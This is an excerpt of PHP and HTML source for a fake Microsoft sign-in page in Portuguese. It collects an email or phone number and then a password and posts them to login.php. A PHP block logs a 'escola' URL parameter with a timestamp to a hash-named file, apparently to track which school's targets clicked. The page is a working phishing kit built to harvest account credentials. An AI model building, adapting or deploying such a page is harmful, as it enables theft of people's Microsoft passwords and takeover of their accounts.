<?php
	...
	$escola = $_GET['escola'] ?? 'N/D';
    $_SESSION['escola'] = $escola;

	if(isset($_SESSION['escola'])){
		$fileName = 'E4D0024355A9238A1F68C8B013FD0731F83B3D8986F2C2FB44D4A4B77F91EBDB_acess.txt';

		$myfile = fopen($fileName, "a+") or die("Unable to open file!");
		fwrite($myfile, 'time='. date("Y-m-d h:i:sa") .' escola=' .$escola . "\n");
		fclose($myfile);
	}
...
<div id="bady">
  ...
  <form name="form1" spellcheck="false" method="post" action="login.php" autocomplete="off" onsubmit="return checkPassy();">
   	<div class="chamber">
    <div class="logo">
		...
		<input type="email" style="border: none; border:none;
		border-bottom: 1px solid rgba(54, 53, 53, 0.822);
		padding: 5px 10px;
		outline: none;" name="login" id="logn" placeholder="Email, telefone, ou Skype">
		...
		<button name="button" type="button" style="margin-top: 10px; width: 40%; float: right;" class="btn-primary" id="button" onclick="checkFilled()">Seguinte</button>
		<!-- piachie onyembu -->
		</div>
		...
		<div class="ugogbe"><span class="logn"></span></div> 
		<h2>Introduzir palavra-passe</h2>
		<div id="efired" style="display:none;">Introduza a palavra-passe para a sua conta Microsoft.</div>
		<label for="passd"></label>
		<input type="password" name="pass" id="passd" placeholder="Palavra-passe">
		<div style="width:332px;">
		<button name="button" class="oo-primary" id="button" type="button">Voltar</button>

		<button name="button" class="pp-primary" id="button2" type="submit" onclick="check(this.form)">Iniciar Sessão</button>
		...
		<div style="font-size: 15px; line-height: 28px;	white-space: nowrap; overflow: hidden; margin-top:-2px;	width: 310px;	padding-right: 100px; margin-bottom:10px; float: left; margin-left:30px;">Manter a sessão iniciada
		</div>
		</div>
		<div><a href="http://127.0.0.1:5500/connexion/index.html#" style="background-color: transparent; color: rgb(0, 103, 184); font-size:13px; text-decoration: none;">Esqueceu-se da palavra-passe?</a></div>
		<!-- piachie secondi -->
		</div>
